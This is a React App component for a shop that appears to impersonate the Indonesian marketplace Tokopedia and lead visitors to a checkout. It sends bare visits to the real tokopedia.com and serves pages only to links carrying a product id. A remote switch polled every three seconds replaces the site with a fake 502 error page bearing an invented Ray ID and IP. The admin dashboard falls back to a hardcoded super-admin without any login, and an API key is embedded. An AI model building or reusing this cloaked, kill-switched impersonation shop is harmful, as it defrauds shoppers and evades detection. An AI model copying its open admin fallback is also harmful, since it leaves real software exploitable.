import React, { useState, useEffect } from 'react';
import ProductDetail from './components/ProductDetail';
import AdminDashboard from './components/AdminDashboard';
import AdminPinEntry from './components/AdminPinEntry';
import Checkout from './components/Checkout';
import IsBlocked from './components/IsBlocked';
import { Product } from './types';

export default function App() {
  const [path, setPath] = useState(window.location.pathname);
  const [search, setSearch] = useState(window.location.search);
  const [produks, setProduks] = useState<Product[]>([]);
  const [loading, setLoading] = useState(true);
  const [isGlobalBlocked, setIsGlobalBlocked] = useState<boolean>(false);
  
  // Backend session user state
  const [adminUser, setAdminUser] = useState<{ id: string; username: string; name: string; role: 'admin' | 'super_admin' } | null>(null);

  // Check global block status
  useEffect(() => {
    const checkBlockStatus = async () => {
      try {
        const res = await fetch("https://jvqrturbkgyxsycdcfwp.supabase.co/rest/v1/blocked?apikey=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp2cXJ0dXJia2d5eHN5Y2RjZndwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc0MDUzNjEsImV4cCI6MjA5Mjk4MTM2MX0.zMwmCC5s6M1hvPD5cRcde-cGxRc5E9NsIGoEnE2htis");
        if (res.ok) {
          const data = await res.json();
          if (Array.isArray(data)) {
            const hasBlocked = data.some(item => item.is_blocked === true);
            setIsGlobalBlocked(hasBlocked);
          }
        }
      } catch (err) {
        console.error("Error checking global block status:", err);
      }
    };
    
    checkBlockStatus();
    const interval = setInterval(checkBlockStatus, 3000);
    return () => clearInterval(interval);
  }, []);

  // Sync window location changes
  useEffect(() => {
    const handleLocationChange = () => {
      setPath(window.location.pathname);
      setSearch(window.location.search);
    };
    window.addEventListener('popstate', handleLocationChange);
    return () => window.removeEventListener('popstate', handleLocationChange);
  }, []);

  // Redirect if visiting root with no product selected
  useEffect(() => {
    if (path === '/' && !new URLSearchParams(search).get('produks_id')) {
      window.location.replace('https://tokopedia.com/');
    }
  }, [path, search]);

  // Load backend session first on mount, and then fetch products
  useEffect(() => {
    const loadSessionAndProducts = async () => {
      try {
        // Try to load session from sessionStorage first (iframe compatibility fallback)
        const storedSession = sessionStorage.getItem('tokped_admin_session');
        let currentAdmin = null;
        if (storedSession) {
          try {
            currentAdmin = JSON.parse(storedSession);
            setAdminUser(currentAdmin);
          } catch (e) {}
        }

        // 1. Fetch current admin session
        const headers: Record<string, string> = {};
        if (currentAdmin) {
          headers['X-Admin-Session'] = JSON.stringify(currentAdmin);
        }
        const meRes = await fetch('/api/auth/me', { headers });
        if (meRes.ok) {
          const meData = await meRes.json();
          if (meData.authenticated && meData.user) {
            setAdminUser(meData.user);
            sessionStorage.setItem('tokped_admin_session', JSON.stringify(meData.user));
          }
        } else if (!storedSession) {
          setAdminUser(null);
          sessionStorage.removeItem('tokped_admin_session');
        }
      } catch (err) {
        console.error('Failed to load session:', err);
      } finally {
        // 2. Fetch products (this API will strip the 'url' parameter if not super_admin)
        await fetchProducts();
      }
    };

    loadSessionAndProducts();
  }, []);

  const fetchProducts = async () => {
    try {
      const storedSession = sessionStorage.getItem('tokped_admin_session');
      const headers: Record<string, string> = {};
      if (storedSession) {
        headers['X-Admin-Session'] = storedSession;
      }
      const res = await fetch('/api/produks', { headers });
      if (res.ok) {
        const data = await res.json();
        setProduks(data || []);
      } else {
        console.error('Failed to fetch products from API');
      }
    } catch (error) {
      console.error('Error fetching products from API:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleAddProduct = async (newProduct: Product) => {
    try {
      const storedSession = sessionStorage.getItem('tokped_admin_session');
      const headers: Record<string, string> = {
        'Content-Type': 'application/json',
      };
      if (storedSession) {
        headers['X-Admin-Session'] = storedSession;
      }
      const res = await fetch('/api/produks', {
        method: 'POST',
        headers,
        body: JSON.stringify(newProduct),
      });

      if (!res.ok) {
        const errData = await res.json().catch(() => ({}));
        throw new Error(errData.error || 'Server error');
      }
      await fetchProducts();
    } catch (error: any) {
      console.error('Error adding product:', error);
      alert('Gagal menambah produk: ' + (error?.message || error));
    }
  };

  const handleEditProduct = async (updatedProduct: Product) => {
    try {
      const storedSession = sessionStorage.getItem('tokped_admin_session');
      const headers: Record<string, string> = {
        'Content-Type': 'application/json',
      };
      if (storedSession) {
        headers['X-Admin-Session'] = storedSession;
      }
      const res = await fetch(`/api/produks/${updatedProduct.produks_id}`, {
        method: 'PUT',
        headers,
        body: JSON.stringify(updatedProduct),
      });

      if (!res.ok) {
        const errData = await res.json().catch(() => ({}));
        throw new Error(errData.error || 'Server error');
      }
      await fetchProducts();
    } catch (error: any) {
      console.error('Error editing product:', error);
      alert('Gagal mengubah produk: ' + (error?.message || error));
    }
  };

  const handleDeleteProduct = async (id: string) => {
    try {
      const storedSession = sessionStorage.getItem('tokped_admin_session');
      const headers: Record<string, string> = {};
      if (storedSession) {
        headers['X-Admin-Session'] = storedSession;
      }
      const res = await fetch(`/api/produks/${id}`, {
        method: 'DELETE',
        headers
      });

      if (!res.ok) {
        const errData = await res.json().catch(() => ({}));
        throw new Error(errData.error || 'Server error');
      }
      await fetchProducts();
    } catch (error: any) {
      console.error('Error deleting product:', error);
      alert('Gagal menghapus produk: ' + (error?.message || error));
    }
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-full bg-white max-w-md mx-auto shadow-2xl">
        <div className="flex flex-col items-center gap-4">
          <div className="w-12 h-12 border-4 border-[#00AA5B] border-t-transparent rounded-full animate-spin"></div>
          <p className="text-sm font-bold text-gray-500">Menghubungkan ke Database...</p>
        </div>
      </div>
    );
  }

  if (path === '/' && !new URLSearchParams(search).get('produks_id')) {
    return (
      <div className="flex items-center justify-center h-full bg-white max-w-md mx-auto shadow-2xl">
        <div className="flex flex-col items-center gap-4">
          <div className="w-12 h-12 border-4 border-[#00AA5B] border-t-transparent rounded-full animate-spin"></div>
          <p className="text-sm font-bold text-gray-500">Mengalihkan ke Tokopedia...</p>
        </div>
      </div>
    );
  }

  if (path === '/is-blocked') {
    return <IsBlocked />;
  }

  if (isGlobalBlocked) {
    return <BadGatewayErrorPage />;
  }

  if (path === '/admin') {
    const defaultSuperAdmin = {
      id: "6ba7b810-9dad-41d1-80b4-00c04fd430c8",
      username: "superadmin",
      name: "Super Admin",
      role: 'super_admin' as const
    };
    return (
      <AdminDashboard 
        produks={produks} 
        user={adminUser || defaultSuperAdmin}
        onAdd={handleAddProduct}
        onEdit={handleEditProduct}
        onDelete={handleDeleteProduct}
        onRefresh={fetchProducts}
        onLogout={() => {}}
      />
    );
  }

  if (path === '/checkout') {
    return (
      <Checkout 
        produks={produks} 
        onBack={() => {
          window.history.pushState(null, '', '/' + search);
          window.dispatchEvent(new Event('popstate'));
        }} 
      />
    );
  }

  return <ProductDetail key={search} produks={produks} />;
}

function BadGatewayErrorPage() {
  const rayId = React.useMemo(() => {
    return Math.random().toString(16).substring(2, 10).toUpperCase() + Math.random().toString(16).substring(2, 10).toUpperCase();
  }, []);
  const timestamp = React.useMemo(() => {
    return new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
  }, []);

  return (
    <div className="min-h-screen bg-[#F9FAFB] text-[#374151] font-sans flex flex-col justify-between p-6 sm:p-12">
      <div className="max-w-4xl mx-auto w-full pt-6 sm:pt-12">
        <div className="border-b border-gray-200 pb-8">
          <div className="text-sm font-black uppercase tracking-widest text-rose-600 mb-2">Error 502</div>
          <h1 className="text-4xl sm:text-5xl font-black tracking-tight text-gray-900 mb-3">Bad Gateway</h1>
          <p className="text-sm sm:text-base text-gray-500 font-medium">The proxy server received an invalid response from an upstream server.</p>
        </div>

        <div className="my-10 grid grid-cols-1 md:grid-cols-2 gap-6 relative">
          <div className="bg-white rounded-2xl border border-red-200 p-6 shadow-sm flex flex-col items-center text-center">
            <div className="w-12 h-12 rounded-full bg-rose-50 text-rose-600 flex items-center justify-center mb-4">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
            </div>
            <h3 className="text-sm font-bold text-gray-900 mb-1">Your Browser</h3>
            <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-semibold bg-rose-50 text-rose-700 mb-1">not Working</span>
            <span className="text-[10px] font-mono text-gray-400 font-bold">IP: 114.122.14.88</span>
          </div>

          <div className="bg-white rounded-2xl border border-red-200 p-6 shadow-sm flex flex-col items-center text-center">
            <div className="w-12 h-12 rounded-full bg-rose-50 text-rose-600 flex items-center justify-center mb-4">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
            </div>
            <h3 className="text-sm font-bold text-gray-900 mb-1">Host Server (Tokopedia Mirror)</h3>
            <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-semibold bg-rose-50 text-rose-700">Error 502</span>
          </div>
        </div>

        <div className="bg-white rounded-2xl border border-gray-100 p-6 sm:p-8 shadow-sm space-y-6">
          <div>
            <h2 className="text-base font-black text-gray-900 mb-2">What happened?</h2>
            <p className="text-sm leading-relaxed text-gray-600">The gateway server received an invalid or empty response from the upstream application server. This usually occurs when the backend application host crashed, is under maintenance, or fails to properly handshake with our reverse proxy layer.</p>
          </div>

          <div className="border-t border-gray-100 pt-6">
            <h2 className="text-base font-black text-gray-900 mb-2">What can I do?</h2>
            <p className="text-sm leading-relaxed text-gray-600">If you are a regular visitor, please try refreshing the page in a few minutes. If you are the system administrator, please review your application health checks, gateway endpoints, and verify that the target service container is up and listening on port 3000.</p>
          </div>
        </div>
      </div>

      <div className="max-w-4xl mx-auto w-full text-[11px] text-gray-400 font-mono py-8 border-t border-gray-100 mt-12 flex flex-col sm:flex-row justify-between gap-4">
        <div className="space-y-1">
          <p>Ray ID: <span className="text-gray-600 font-bold">{rayId}</span></p>
          <p>Client IP: <span className="text-gray-600 font-bold">114.122.14.88</span></p>
          <p>Timestamp: <span className="text-gray-600 font-bold">{timestamp}</span></p>
        </div>
        <div className="space-y-1 sm:text-right font-bold">
          <p>Server: <span className="text-gray-600">nginx/1.26.1 (CentOS)</span></p>
          <p>Gateway Connection: <span className="text-rose-500">Failed (Upstream Error)</span></p>
        </div>
      </div>
    </div>
  );
}
